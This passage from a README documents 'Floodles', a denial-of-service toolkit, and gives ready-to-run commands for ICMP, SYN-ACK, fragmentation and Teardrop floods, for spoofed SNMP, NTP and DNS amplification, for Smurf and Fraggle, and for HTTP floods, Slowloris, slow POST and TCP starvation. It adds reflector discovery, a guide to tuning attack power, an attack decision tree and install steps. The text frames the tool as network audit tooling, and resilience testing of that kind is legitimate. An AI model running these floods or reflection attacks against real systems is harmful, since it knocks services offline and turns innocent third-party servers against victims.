sysctl net.ipv4.icmp_ratelimit   # default 1000ms — at most 1 ICMP/second
```

---

### 4.6 ICMP Flood (PINGER)

#### Detailed Mechanism

ICMP echo request (type 8) expects an echo reply (type 0). For each received ping, the kernel must:
1. Validate the ICMP checksum
2. Allocate a reply buffer
3. Copy the payload
4. Construct and send the echo reply

**The bandwidth multiplier**: the attacker sends X bytes/second inbound; the target generates X bytes/second outbound in replies. Total bandwidth consumed = 2X. With IP spoofing, the replies go to random IPs — third parties receive unsolicited ICMP traffic, and the target saturates its own outbound link with replies.

#### ICMP Rate Limiting

Linux enforces a built-in ICMP response rate limit:

```bash
sysctl net.ipv4.icmp_ratelimit   # default: 1000 (1 response per 1000ms = 1/sec)
sysctl net.ipv4.icmp_ratemask    # which ICMP types are rate-limited
```

With `icmp_ratelimit=1000`, the kernel generates at most 1 ICMP echo reply per second regardless of incoming flood rate. The inbound bandwidth is still consumed (NIC must receive and discard packets), but the outbound saturation loop is broken. An ICMP flood on a properly configured Linux server primarily tests the upstream pipe capacity, not server resources.

```bash
# Standard ICMP flood (56-byte payload, like ping)
sudo floodles icmp 192.168.1.100 -s 56 -t 4 -d 30

# Near-MTU for bandwidth saturation
sudo floodles icmp 192.168.1.100 -s 1400 -t 8 -d 60

# Verify rate limiting on target
sysctl net.ipv4.icmp_ratelimit
# 1000 = 1/sec rate limit (correct)
# 0    = unlimited (vulnerable to reply-storm)
```

---

### 4.7 SYN-ACK Flood (TACHYON)

#### Direct Mode

Spoofed SYN-ACK packets are sent directly to the target. An unsolicited SYN-ACK triggers an RST in response: the kernel checks its connection table, finds no matching half-open connection, and resets. The cost is the same as an ACK flood: a connection table lookup and RST generation per packet.

Less effective than SYN flood against a standalone server. More interesting for testing firewalls that pass SYN-ACKs inbound (reasoning: "it looks like a legitimate server response").

#### Reflected Mode — Leveraging Real Servers as Sources

The reflected variant is considerably more sophisticated. Instead of sending SYN-ACKs directly, the attacker sends SYNs with the victim's IP as the spoofed source to legitimate public servers. Those servers send their SYN-ACKs to the victim.

```
Direct SYN flood (obvious):
  Attacker -> SYN (src=random) -> Victim
  -> Traffic source is random/spoofed IPs

TACHYON reflected (harder to filter):
  Attacker -> SYN (src=victim_ip) -> CDN_server_1
  CDN_server_1 -> SYN-ACK         -> victim_ip  <- Victim receives this

  Attacker -> SYN (src=victim_ip) -> CDN_server_2
  CDN_server_2 -> SYN-ACK         -> victim_ip

  Attacker -> SYN (src=victim_ip) -> CDN_server_3 ... x1000
```

The victim receives SYN-ACKs from real, legitimate servers with good-reputation IPs (CDN nodes, cloud providers, major websites). IP reputation blacklists are useless — every source IP is a legitimate server. The amplification factor is approximately 1x (SYN-ACK is similar in size to SYN), but the traffic's source diversity makes scrubbing extremely costly.

```bash
# Direct SYN-ACK flood
sudo floodles tachyon 192.168.1.100 --port 80 --mode direct -t 8 -d 60

# Reflected (requires a list of real servers as reflectors)
sudo floodles tachyon 192.168.1.100 --mode reflected -r 1.2.3.4,5.6.7.8 --ref-port 80 -d 60
```

---

### 4.8 IP Fragmentation (DROPER)

#### How IP Fragmentation Works

When a packet exceeds the MTU (1500 bytes on Ethernet), IP splits it into fragments. Each fragment shares a common **Identification** field and carries a **Fragment Offset** indicating its position in the original datagram. The **MF (More Fragments)** flag is set on all fragments except the last.

The receiver must hold all fragments in a **reassembly buffer** until the complete set arrives, then reconstruct the original packet. Linux maintains these buffers in a hash table (`ipq hash table`), governed by:

```bash
sysctl net.ipv4.ipfrag_max_dist    # max fragment distance before drop
sysctl net.ipv4.ipfrag_time        # reassembly timeout (default: 30 seconds)
sysctl net.ipv4.ipfrag_high_thresh # max memory for all pending reassemblies
sysctl net.ipv4.ipfrag_low_thresh  # flush threshold
```

#### Standard Flood Variant

Sends thousands of tiny fragments (8 bytes each, minimum valid fragment) with randomized Identification fields. Each unique ID occupies one slot in the reassembly hash table. When the table fills (determined by `ipfrag_high_thresh`, default 4 MB), new fragments and all legitimate fragmented traffic are dropped.

#### Last-Fragment-Only Variant (Most Efficient)

Sends only the **last fragment** of a fictitious datagram: `MF=0` (no more fragments), `offset > 0` (not the first). The kernel cannot reassemble without the first fragment, so it allocates a reassembly buffer and waits for `ipfrag_time` (30 seconds) before expiring.

```
1 last_only fragment -> buffer allocated, held for 30 seconds
1000 last_only packets/second -> 30,000 active buffers simultaneously
-> ipfrag_high_thresh exhausted -> all fragmented traffic dropped for everyone
```

This is a low-PPS, high-sustained-impact attack. 1000 PPS of 8-byte fragments is barely measurable bandwidth (~64 Kbps), yet it can deny all fragmented traffic for the duration.

```bash
# Standard fragmentation flood
sudo floodles frag 192.168.1.100 --variant flood -t 4 -d 60

# Last-fragment-only (low bandwidth, sustained impact)
sudo floodles frag 192.168.1.100 --variant last_only -t 2 -d 120

# Monitor reassembly on the target
watch -n1 'grep "Reasm" /proc/net/snmp'
# ReasmFails rising -> reassembly buffer exhausted or fragments dropped
```

---

### 4.9 Fragment Overlap (OVERLAP)

#### Teardrop — CVE-1999-0015

Teardrop sends two IP fragments where the second fragment's offset overlaps the first. The reassembly code in vulnerable kernels mishandles this overlap:

```
Fragment 1: offset=0, length=68  (covers bytes 0-67)
Fragment 2: offset=24, length=48 (covers bytes 24-71)
            |<-- overlaps bytes 24-67 of fragment 1

Correct behavior: truncate or discard the overlapping bytes
Vulnerable behavior: integer underflow in memcpy length calculation
  -> memcpy(buf, data, 48 - 44) = memcpy(buf, data, 4)   <- OK
  Crafted variant:
  -> memcpy(buf, data, 8 - 48)  = memcpy(buf, data, -40) <- wraps to huge value
  -> kernel heap corruption -> kernel panic
```

Linux kernels since 2.0.32 (patched 1997), Windows 95/NT patched in 1997-1998. Still found on unpatched embedded devices, industrial controllers, legacy SCADA systems.

#### Modern Variants

| Variant | Description |
|---------|-------------|
| `teardrop` | Classic CVE-1999-0015 overlap |
| `rose` | Variant targeting different calculation path |
| `tiny` | Very small fragments forcing maximum overlap |

```bash
# Test all variants against legacy equipment
sudo floodles overlap 192.168.1.100 --variant teardrop -t 2 -d 30
sudo floodles overlap 192.168.1.100 --variant rose     -t 2 -d 30
sudo floodles overlap 192.168.1.100 --variant tiny     -t 2 -d 30

# Indicator of success: target becomes unreachable -> kernel panic
ping -c 5 192.168.1.100
# No response after attack -> potential crash
```

---

## 5. Amplification Modules — DRDoS

### 5.1 Understanding Amplification

**Distributed Reflected DoS (DRDoS)** exploits a fundamental property of stateless UDP protocols: a server sends its response to whatever source IP appears in the request — with no way to verify it.

The attack requires three conditions:
1. A protocol that uses UDP and produces large responses to small requests
2. A server running that protocol with no source filtering (an "open reflector")
3. The ability to spoof the source IP in outbound packets

When all three are present, the attacker can direct massive traffic toward a victim while consuming only a fraction of the bandwidth:

```
Attacker bandwidth: 1 Mbps (outbound, to reflectors)
Amplification factor: 500x
Victim bandwidth received: 500 Mbps (inbound, from reflectors)
Attacker's bandwidth consumed: still 1 Mbps

-> 500:1 leverage from a single host
-> Traffic arrives from legitimate, good-reputation server IPs
-> The reflectors bear the bandwidth cost of the response
```

The attacker's identity is further protected: packets arrive at the victim from the reflectors, not from the attacker. The attacker sends traffic to the reflectors, but those packets have the victim's IP as source — so even the reflectors don't know who the attacker is.

**Historical scale**: DRDoS attacks have generated the largest DDoS volumes on record. The 2018 GitHub attack used Memcached servers (amplification factor ~51,000x) to deliver 1.35 Tbps sustained at the target. A single attacker with a 30 Mbps uplink could theoretically generate that if enough Memcached reflectors existed. Floodles implements the protocols that remain relevant in modern internal audits.

---

### 5.2 SNMP Reflection (SNIPER)

#### Protocol Background

SNMP (Simple Network Management Protocol) is a UDP protocol (port 161) for querying and configuring network equipment. SNMP v1 and v2c authenticate via a **community string** — a plaintext password transmitted in every request. The default community string on virtually all equipment is `public`.

SNMP v2c introduces the **GetBulkRequest**: a single request that asks the agent to return up to `max-repetitions` OID values, traversing a large subtree of the MIB in one response. This is the legitimate equivalent of `snmpwalk`, compressed into one round trip.

#### Amplification Mechanics

```
GetBulkRequest payload:
  non-repeaters=0, max-repetitions=255 -> dump entire MIB subtree
  Size: ~60 bytes

GetBulkResponse:
  Agent returns up to 255 rows of OID data
  Typical MIB subtree for .1.3.6.1.2.1: 40-65 KB of data
  Delivered in multiple UDP datagrams (max 65,507 bytes each)
  Amplification factor: ~650x
```

The attack chain with Floodles:

```
1. Attacker identifies a reflector with public community:
   snmpwalk -v2c -c public 192.168.1.50 .1.3.6.1.2.1
   -> Returns MIB data: VULNERABLE

2. Floodles sends UDP datagram:
   IP src  = victim_ip   (spoofed)
   IP dst  = 192.168.1.50
   UDP dst = 161
   Payload = GetBulkRequest, OID=.1.3.6.1.2.1, max-rep=255 (~60 bytes)

3. SNMP agent processes legitimately:
   Dumps MIB subtree -> 40 KB response
   Sends to IP src = victim_ip

4. Victim receives 40 KB per 60-byte query
   With 10 such reflectors in parallel: 1 Mbps out -> 650 Mbps in
```

```bash
# Find open SNMP reflectors on the network
nmap -sU -p 161 --open 192.168.1.0/24
snmpwalk -v2c -c public 192.168.1.50 .1.3.6.1.2.1   # test community string

# Measure actual amplification factor
snmpbulkget -v2c -c public -Cn0 -Cr255 192.168.1.50 .1.3.6.1.2.1 | wc -c
# Divide by ~60 (request size) -> actual factor

# Try common community strings
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.50

# Launch amplification attack
sudo floodles sniper 192.168.1.200 -r 192.168.1.50,192.168.1.51 --community public -t 4 -d 60
```

#### Why SNMP v3 Eliminates This

SNMPv3 uses per-session authentication (HMAC-SHA or HMAC-MD5) keyed to a shared secret. The response is cryptographically bound to the authenticated session. A spoofed GetBulkRequest without the correct HMAC is rejected. The amplification vector is structurally impossible with v3.

#### Commonly Vulnerable Equipment

- Network printers (HP JetDirect, Brother, Xerox): `public` community by default, often internet-facing
- Managed switches: SNMP enabled at deployment and never reconfigured
- UPS management cards (APC, Eaton, Liebert): factory-default SNMPv2c config
- Industrial/SCADA controllers: legacy firmware with no SNMPv3 support
- Cisco IOS (pre-2018 configs): `snmp-server community public RO` default

---

### 5.3 NTP Amplification (MONLIST)

#### The monlist Command

NTP (Network Time Protocol, RFC 5905) synchronizes clocks over UDP port 123. Like SNMP, it uses UDP — no handshake, source IP trusted by default.

The `monlist` command (NTP private mode 7, request code 42) is a **monitoring feature**: it returns the last 600 IP addresses that queried this NTP server. Each client entry is 44-72 bytes. The full response is fragmented across multiple UDP datagrams.

```
monlist request  : 8 bytes (one UDP packet)
monlist response : up to 600 entries x ~72 bytes = 43,200 bytes
                   Delivered in ~10 UDP datagrams
Amplification    : 43,200 / 8 = ~5,400x (server with 600 cached clients)
```

The factor is state-dependent: a freshly started NTP server with 0 cached clients returns nothing. A production NTP server that has been running for months and has served 600 distinct clients returns the maximum response. This is the reason NTP amplification in the wild could sustain such extreme ratios.

The 2014 Cloudflare incident and subsequent US-CERT alert TA14-017A documented NTP monlist as one of the primary amplification vectors of that period, with observed factors up to 4,096:1 on busy reflectors.

```
Attack chain:
  1. Attacker finds NTP server with monlist enabled:
     ntpq -c monlist 192.168.1.1
     -> Client list returned: VULNERABLE

  2. Floodles sends:
     IP src  = victim_ip  (spoofed)
     IP dst  = 192.168.1.1
     UDP dst = 123
     Payload = monlist request (8 bytes)

  3. NTP server looks up its 600-client history, sends full response to victim_ip
     -> victim receives ~43,200 bytes per 8-byte request

  4. With 5 reflectors at 5,000x: 1 Mbps out -> 5 Gbps in
```

```bash
# Probe — does monlist respond? (passive, no attack)
ntpq -c monlist 192.168.1.1
# Client list returned -> vulnerable -> disable monlist immediately
# "No association ID" or timeout -> patched or firewalled

nmap -sU -p 123 --script ntp-monlist 192.168.1.1

# Launch amplification
sudo floodles ntp 192.168.1.200 -r 192.168.1.1,192.168.1.2 -t 4 -d 60
```

#### Vulnerability Status

CVE-2013-5211. Patched in ntpd 4.2.7p26 (2013): monlist disabled by default. But:
- Embedded NTP implementations on switches, printers, and industrial equipment are rarely updated
- Corporate Windows NTP servers (w32tm) never implemented monlist, but some appliances do
- The check remains standard in any internal network audit

Remediation:

```bash
# /etc/ntp.conf — disable all mode 7 queries
restrict default noquery nopeer nomodify notrap

# Or upgrade to ntpd >= 4.2.7p26
# Block UDP/123 inbound from internet to internal NTP servers
```

---

### 5.4 DNS Amplification

#### Two Compounding Conditions

DNS amplification requires both a **query type that generates large responses** and a **resolver that accepts queries from any source IP**.

#### Condition 1 — DNSSEC and the ANY Query

DNS type ANY requests every record the resolver knows for a domain: A, AAAA, MX, NS, SOA, TXT, plus, for DNSSEC-signed zones, DNSKEY records (the zone's public signing keys, 200-400 bytes each) and RRSIG records (cryptographic signatures over each record set).

```
DNS ANY query for a DNSSEC-signed domain: ~40-50 bytes
Full DNSSEC response: 2,000-4,000 bytes
Amplification factor: 40x-100x depending on zone configuration
```

RFC 8482 (2019) recommends resolvers return a minimal HINFO record for ANY queries instead of the full response. Modern **authoritative** servers comply. However, **recursive resolvers** with the full answer cached may still return the complete response — particularly older BIND 9.x or Unbound installations predating 2019.

#### Condition 2 — Open Resolver

A DNS resolver is **open** if it answers recursive queries from any source IP. Correct configuration restricts recursion to internal subnets only.

```bash
# Test: is this resolver open?
dig @192.168.1.53 isc.org ANY

# Closed (correct):
# ;; ->>HEADER<<- opcode: QUERY, status: REFUSED
# -> Recursion denied for unauthorized source

# Open (misconfigured):
# Full DNSSEC response: 3,200 bytes returned
# -> This server can be used as a reflector
```

Common sources of open resolvers: corporate DNS servers without ACLs, old BIND configurations (`allow-recursion { any; };` was BIND 8's default), misconfigured split-horizon deployments.

#### Attack Chain

```
1. Find open resolver:
   dig @192.168.1.53 isc.org ANY -> DNSSEC response returned

2. Floodles sends:
   IP src  = victim_ip  (spoofed)
   IP dst  = 192.168.1.53
   UDP dst = 53
   Payload = DNS ANY query for isc.org (~44 bytes)

3. Resolver sends 3,200-byte DNSSEC response to victim_ip

4. 50 open resolvers in parallel:
   50 x 3,200B / 44B = 50 x 72x = 3,600x effective factor
   1 Mbps out -> 3.6 Gbps in
```

```bash
# Find open resolvers on the network
nmap -sU -p 53 --script dns-recursion 192.168.1.0/24

# Launch DNS amplification
sudo floodles dns 192.168.1.200 -r 192.168.1.53,192.168.1.54 --qtype ANY -t 4 -d 60

# Use DNSKEY query (maximizes DNSSEC response size)
sudo floodles dns 192.168.1.200 -r 192.168.1.53 --qtype DNSKEY -t 4 -d 60

# Load resolver list from file
sudo floodles dns 192.168.1.200 -r @resolvers.txt --qtype ANY -d 60
```

---

### 5.5 Smurf Attack

#### Mechanism

Smurf uses ICMP echo requests directed at **broadcast addresses**. When an ICMP echo request is sent to a broadcast address (e.g., `192.168.1.255` for a /24 subnet), every host on that subnet is supposed to reply with an ICMP echo reply.

```
Attacker -> ICMP echo request (src=victim_ip, dst=192.168.1.255)
  -> Every host on 192.168.1.0/24 receives the broadcast
  -> Each host sends an ICMP echo reply to victim_ip

With 120 hosts on the subnet:
  1 request -> 120 replies
  Amplification factor: 120x (network size dependent)
```

Modern routers drop directed broadcasts by default (`no ip directed-broadcast` in Cisco IOS since 12.0). The check in an audit is precisely whether this default was preserved or accidentally overridden.

```bash
# Test: does the router forward directed broadcasts?
ping -b 192.168.1.255 -c 3
# Multiple replies -> broadcast forwarding enabled -> Smurf viable

# Launch Smurf
sudo floodles smurf 192.168.1.200 -b 192.168.1.255 -t 4 -d 30

# On /24 with many active hosts
sudo floodles smurf 192.168.1.200 -b 192.168.1.0/24 -d 60
```

---

### 5.6 Fraggle Attack

#### Mechanism

Fraggle is the UDP equivalent of Smurf. It sends spoofed UDP packets to the **broadcast address** on two echo service ports:

- **Port 7 (Echo)**: the server sends back whatever it received — a direct echo. One 64-byte request generates one 64-byte reply from each host. Factor = number of hosts with Echo service enabled.
- **Port 19 (Chargen)**: the server generates a continuous stream of arbitrary characters. One request can trigger multiple responses, increasing the amplification factor beyond 1x per host.

Echo and Chargen services are disabled by default on all modern OS. Their presence indicates a legacy host or a misconfigured service (common on older network equipment with `service tcp-small-servers` or `service udp-small-servers` on Cisco IOS pre-12.0).

```bash
# Test Echo service (port 7)
echo "test" | nc -u 192.168.1.50 7 -w 1
# "test" echoed back -> Echo service running -> Fraggle viable

# Launch Fraggle
sudo floodles fraggle 192.168.1.200 -b 192.168.1.255 --port 7 -d 30
sudo floodles fraggle 192.168.1.200 -b 192.168.1.255 --port 19 -d 30
```

---

### 5.7 Multi-Vector (SPRAY)

SPRAY launches multiple amplification vectors simultaneously from a single YAML configuration, correlating their traffic toward a single victim. This matches real-world attack patterns: single-vector DDoS is trivial to identify and filter; simultaneous SNMP + NTP + DNS + Smurf from different source classes stresses mitigation systems that must apply different rules per protocol.

```yaml
# config/examples/spray.yaml
victim: 192.168.1.200
vectors:
  - type: snmp
    reflectors: [192.168.1.50, 192.168.1.51]
    community: public
    threads: 4
  - type: ntp
    reflectors: [192.168.1.1]
    threads: 2
  - type: dns
    reflectors: [192.168.1.53]
    qtype: ANY
    threads: 2
duration: 120
```

```bash
sudo floodles spray 192.168.1.200 -c config/examples/spray.yaml -d 120
```

---

## 6. Layer 7 Modules — Application

### 6.1 HTTP Flood (LOIC L7)

#### Detailed Mechanism

An HTTP flood sends legitimate-looking HTTP requests as fast as possible. Unlike L3/L4 floods, the TCP handshake completes — each request is a real connection that reaches the application. The application must process the request: parse headers, query a database, render a template, call downstream APIs, and write a response.

A single HTTP request that queries a database can consume 10-100 ms of CPU time and multiple disk I/Os. At 10,000 RPS, a server with 100ms per-request processing time needs 1,000 CPU cores to sustain the load. Obviously it doesn't have them.

#### The Go Engine

Floodles uses `native/go/engine.go` for HTTP flooding. Each goroutine maintains a persistent HTTP connection pool (Go's `net/http` client reuses TCP connections by default via `Connection: keep-alive`). This means the flood generates HTTP requests, not TCP connections — the L4 overhead is amortized.

The engine rotates User-Agent strings (Chrome, Firefox, Safari, mobile, curl) and optionally adds cache-busting query parameters (`?_=<random>`) to prevent CDN caching from absorbing the load:

```bash
# Basic HTTP flood
floodles http http://192.168.1.100/ -c 2000 -d 60

# POST flood with body (stresses request parsing and upload handling)
floodles http http://192.168.1.100/api/submit -m POST --post-size 4096 -c 1000 -d 60

# Cache-busting (default: enabled — disable with --no-bust for cached endpoint tests)
floodles http http://192.168.1.100/search?q=test -c 2000 -d 60

# HTTPS (TLS handshake adds CPU cost on the server side)
floodles http https://192.168.1.100/ -c 2000 -d 60
```

---

### 6.2 Slowloris (LORIS)

#### Detailed Mechanism

Slowloris (RSnake, 2009) does not flood. It **starves** the web server of connection slots. Most HTTP servers maintain a fixed pool of worker threads or processes (e.g., Apache prefork: default 150 workers). Each worker blocks while handling a request. Slowloris sends HTTP requests that are intentionally incomplete:

```
Slowloris connection lifecycle:
  1. TCP handshake (completes normally)
  2. Send partial HTTP request:
     "GET / HTTP/1.1\r\n"
     "Host: target.com\r\n"
     "X-Timeout: " (incomplete — header has no value, no \r\n)
  3. Every 15 seconds, send one more header byte to keep the connection alive:
     "a"
     "b"
     ...
  4. Server's worker thread blocks waiting for the request to complete
  5. Repeat with 500 concurrent connections
  -> 500 workers blocked -> server's thread pool exhausted
  -> Legitimate requests queue forever -> effective DoS
```

The server cannot distinguish this from a legitimate slow client (mobile on 2G, congested network). The attack uses no significant bandwidth — it is entirely about occupying server thread resources.

**nginx is resistant** by design: it uses non-blocking I/O (event-driven architecture). A slow connection does not block a worker — it simply waits in the event queue. nginx can handle thousands of slow connections without degradation.

**Apache prefork and worker MPM are vulnerable** (without additional configuration like `RequestReadTimeout`).

```bash
# Slowloris against Apache (vulnerable by default)
floodles slow target.com -p 80 -s 500 -i 15 -d 120

# HTTPS variant (TLS adds server-side CPU for each socket)
floodles slow target.com -p 443 -s 300 --ssl -d 120

# Verify impact — from another host:
curl --connect-timeout 5 http://target.com/
# -> connection timed out: attack effective
```

---

### 6.3 Slow POST (RUDY)

#### Detailed Mechanism

RUDY (R-U-Dead-Yet?) is the POST equivalent of Slowloris. A legitimate POST request announces its body size in the `Content-Length` header, then streams the body. RUDY announces a large `Content-Length` (e.g., 10 MB) and sends the body at 1 byte every 10-15 seconds.

```
RUDY connection:
  POST /upload HTTP/1.1
  Host: target.com
  Content-Length: 10485760   <- claims 10 MB body
  Content-Type: application/x-www-form-urlencoded

  [waits 15 seconds]
  a
  [waits 15 seconds]
  b
  ...

Server's worker thread is blocked receiving the body.
At 500 concurrent connections: 500 threads blocked for the duration.
```

The server cannot close the connection — it committed to receiving the POST body. The attack is fully RFC-compliant. Without application-level rate limiting (minimum upload rate, per-IP connection limits, body timeout), the server has no legitimate way to distinguish RUDY from a client with a very slow upload connection.

```bash
floodles slowpost target.com -p 80 -s 200 --cl 10485760 -i 15 -d 180
```

---

### 6.4 TCP Starvation (NUKE)

#### Mechanism Variants

NUKE exhausts the server's TCP connection table rather than its application threads. Three variants target different states:

**`hold`** — Completes the TCP handshake, then sends no data. The server's connection is `ESTABLISHED` waiting for an HTTP request. Connection tables have a maximum size. With enough sockets held open:

```
netstat -an | grep ESTABLISHED | wc -l
# Rising toward net.core.somaxconn or application limit
```

**`window0`** — Sends TCP window size of 0 after connecting. The server has data to send (HTTP response) but the client's receive window is full. The server must maintain the connection and retransmit when the window opens. It never opens. The server is stuck with an established connection consuming a table slot and memory, waiting indefinitely.

**`persist`** — Sends TCP keepalive frames to prevent the server's idle timeout from closing the connection, maintaining it in a zombie state.

```bash
# Hold connections open (simplest)
floodles nuke target.com -p 80 -s 500 --variant hold -d 120

# Window-zero stall (server holds state waiting to send)
floodles nuke target.com -p 80 -s 300 --variant window0 -d 180

# Persistent keepalive zombie
floodles nuke target.com -p 80 -s 200 --variant persist -i 30 -d 300
```

---

## 7. Tuning Attack Power — Practical Guide

### 7.1 General Principle

Never start at maximum load. Use a tiered approach that gives you observable data at each step:

```
Tier 1 — Probe (5-10% of estimated max)
  -> Verify the module works, establish a baseline
  -> Does the target notice? Does the IDS alert?

Tier 2 — Pressure (20-30%)
  -> Observe latency increase, partial degradation
  -> At what PPS does response time double?

Tier 3 — Saturation Threshold (60-80%)
  -> Find the degradation cliff — the point of meaningful service impact
  -> Document the exact PPS/concurrency value

Tier 4 — Full Load
  -> Confirm the protection mechanism's actual ceiling
  -> Measure recovery time after stopping
```

### 7.2 Key Parameters

```bash
# -t / --threads: worker threads (L3/L4 only)
# -d / --duration: test duration in seconds (0 = run until Ctrl+C)
# --pps: cap packets per second (0 = unlimited)
# -c / --concurrency: concurrent connections (L7 only)
# -s / --sockets: concurrent sockets (Slowloris / RUDY / NUKE)
# --no-spoof: disable IP spoofing (use your real source IP)
# --no-log: disable JSONL logging

# Progressive SYN flood example:
sudo floodles syn 192.168.1.100 80 -t 2 --pps 5000  -d 30   # tier 1
sudo floodles syn 192.168.1.100 80 -t 4 --pps 30000 -d 60   # tier 2
sudo floodles syn 192.168.1.100 80 -t 8 --pps 100000 -d 60  # tier 3
sudo floodles syn 192.168.1.100 80 -t 16 -d 60              # tier 4
```

### 7.3 Monitoring Your Own Link

An intensive flood can saturate your own sender's network interface before it saturates the target:

```bash
# Monitor your uplink during the attack
watch -n1 'ip -s link show eth0'
# TX packets and TX bytes rising -> you are consuming bandwidth

# If your pings to external hosts increase -> your link is saturating
ping -i 0.1 8.8.8.8
# Latency spike -> reduce --pps or thread count
```

### 7.4 Observing the Target

```bash
# TCP connection state (on the target, if you have access)
watch -n1 'ss -s'
# SYN-RECV rising -> SYN queue filling
# ESTABLISHED count rising -> connection table filling
# TIME-WAIT rising -> post-attack cleanup load

# HTTP service availability (from an unaffected host)
watch -n2 'curl -o /dev/null -s -w "%{http_code} %{time_total}s\n" http://192.168.1.100/'
# 200 1.2s -> degraded but responding
# 000 -> unreachable
```

---

## 8. Audit Methodology

### 8.1 Full Workflow

```
Phase 1: RECON
  floodles scan <target> --ntp
  -> Open ports and services
  -> OS and server version fingerprint
  -> NTP monlist probe
  -> SNMP community probe
  -> DNS recursion check

Phase 2: BASELINE
  -> Measure normal HTTP latency and throughput
  -> Document reference connection table size
  -> Ping baseline (RTT and loss)
  -> Application response time under zero load

Phase 3: TESTING (increasing severity)
  -> Detection tests: XMAS -> IDS alerts?
  -> Bypass tests: ACK flood -> stateful firewall?
  -> Resistance tests: SYN flood -> SYN cookies active?
  -> Application tests: Slowloris -> Apache unprotected?
  -> Amplification audit: SNMP/NTP/DNS open reflectors?

Phase 4: DOCUMENTATION
  -> Degradation threshold per vector
  -> Protection mechanisms: active / ineffective / absent
  -> Remediation recommendation per finding
  -> JSONL logs as evidence appendix
```

### 8.2 Decision Tree

```
floodles scan <target> --ntp
    |
    +-- Port 80/443 open?
    |   +-- Apache/IIS detected -> slowloris + slowpost + nuke
    |   +-- nginx               -> http_flood (resists Slowloris natively)
    |   +-- WAF/CDN in front    -> http_flood POST, cache_bust=true
    |
    +-- Any TCP port open?
    |   +-- Check SYN cookies   -> if disabled: syn_flood
    |   +-- Firewall present    -> ack_flood (stateful?)
    |   +-- IDS in scope        -> xmas_flood (detects?)
    |   +-- Long-lived sessions -> rst_flood
    |
    +-- UDP services?
    |   +-- DNS port 53         -> udp_flood + dns amplification test
    |   +-- NTP port 123        -> ntp monlist probe + ntp_amp
    |
    +-- Amplifiers in scope?
    |   +-- SNMP community public -> sniper (~650x)
    |   +-- NTP monlist           -> ntp_amp (~5,000x)
    |   +-- DNS open resolver     -> dns_amp (~70x)
    |   +-- Active broadcast /24  -> smurf + fraggle
    |   +-- Multiple present      -> spray (multi-vector)
    |
    +-- Legacy/OT/embedded equipment?
        +-- Old kernel (<2.0.32) -> overlap (teardrop)
        +-- Reassembly buffers   -> frag (last_only)
        +-- Echo/Chargen UDP     -> fraggle
```

### 8.3 What to Document Per Finding

For each test:
1. **Vector used** and parameters (`floodles syn 192.168.1.100 80 -t 8 --pps 100000 -d 60`)
2. **Expected result** if protection is correctly configured
3. **Observed result** (degradation, unreachability, log entry)
4. **Threshold** (at what PPS / concurrency does impact begin)
5. **Recovery time** after stopping the flood
6. **Remediation recommendation**

---

## 9. Installation and Build

### 9.0 Quick Install

Two paths depending on whether you want pre-built binaries or to compile from source.

#### Option A — Release tarball (no compiler required)

Download the pre-built tarball from the [Releases](https://github.com/franckferman/Floodles/releases) page. It contains the Python source tree and pre-compiled native backends (`libsender.so`, `libfloodles_packets.so`, `floodles-engine`) for Linux x86_64.

```bash
tar -xzf floodles-vX.Y.Z-linux-x86_64.tar.gz
cd floodles-vX.Y.Z-linux-x86_64

./install.sh        # detects pre-built binaries, skips make / Rust / Go install
source ~/.bashrc    # or source ~/.zshrc
```

`install.sh` checks for the three native binaries before invoking `make`. If all three exist, it skips the Rust/Go toolchain installation and the build step entirely — only `gcc`, Python 3, and `python3-venv` are required.

#### Option B — Git clone (builds from source)

`install.sh` handles everything: system packages, Rust via rustup, Go if missing, Python venv, `pip install -e .`, `make` for all three backends, alias injection.

```bash
git clone https://github.com/franckferman/Floodles.git
cd Floodles
chmod +x install.sh
./install.sh
source ~/.bashrc   # or source ~/.zshrc
```

After install, run `floodles detect` to verify all backends loaded. The sections below document each step individually for environments where the script cannot run.

---

### 9.1 System Prerequisites

**Debian / Ubuntu / Kali**

```bash
sudo apt install gcc build-essential python3 python3-venv git
```

**Arch Linux**

```bash
sudo pacman -S gcc python git base-devel
```

**Rust** (required for the Rust packet builder, `native/rust/src/lib.rs`)

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
rustup default stable   # critical: rustup installs without a default toolchain
```

**Go** (required for the HTTP/Slowloris engine, `native/go/engine.go`)

```bash
sudo apt install golang-go        # Debian/Ubuntu/Kali
sudo pacman -S go                 # Arch

# Or install the latest release manually: https://go.dev/dl/
```

### 9.2 Python Environment (3.10+)

Debian/Ubuntu enforce PEP 668 — direct `pip install` fails system-wide. Use a virtual environment:

```bash
cd Floodles
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

This installs the following from `requirements.txt`:

```
scapy>=2.5.0    # Python fallback packet builder
aiohttp>=3.9.0  # Async HTTP (used in Python-mode HTTP flood)
click>=8.1.0    # CLI framework
rich>=13.7.0    # TUI dashboard
pyyaml>=6.0     # YAML profile loading
```

If you need system-wide installation without venv (not recommended):

```bash
pip install -e . --break-system-packages
```

### 9.3 Build Native Backends

```bash
make
```

This runs `make check` (toolchain detection) then builds all three backends if their toolchain is available. Each backend is skipped silently if its toolchain is missing:

```
[*] Checking toolchains...
    gcc:   OK
    cargo: OK
    go:    OK

[*] Building C sender...
[+] C sender built:    native/c/libsender.so

[*] Building Rust packet builder (this may take 30-60s)...
[+] Rust lib built:    native/rust/target/release/libfloodles_packets.so

[*] Building Go engine...
[+] Go engine built:   native/go/floodles-engine

[+] All native components built.
```

Build individually:

```bash
make c      # native/c/libsender.so        (requires gcc)
make rust   # native/rust/target/release/libfloodles_packets.so  (requires cargo)
make go     # native/go/floodles-engine    (requires go)
make clean  # remove all compiled artifacts
```

### 9.4 Validate Installation

```bash
floodles detect
```

Expected output with all backends:

```
[+] C sender:     loaded  (sendmmsg batch=256, MAX_THREADS=64)
[+] Rust packets: loaded  (zero-copy builder, SIMD checksum)
[+] Go engine:    available (goroutine HTTP/Slowloris, M:N scheduler)

[+] All native backends active. Maximum performance mode.
```

If backends are missing, run `make` and verify the required toolchains are installed.

```bash
# Auto-compile if toolchains are present
floodles detect --compile
```

### 9.5 Permanent Shell Aliases

The `floodles` command is only available inside the active venv. Add these to `~/.bashrc` or `~/.zshrc`:

```bash
# floodles — user mode (Layer 7, no root required)
alias floodles='/home/$USER/Floodles/.venv/bin/floodles'

# sfloodles — root mode (Layer 3/4 raw socket modules)
alias sfloodles='sudo /home/$USER/Floodles/.venv/bin/floodles'
```

```bash
source ~/.bashrc   # or source ~/.zshrc
```

Usage:

```bash
# Layer 7 — no root
floodles http https://target.com
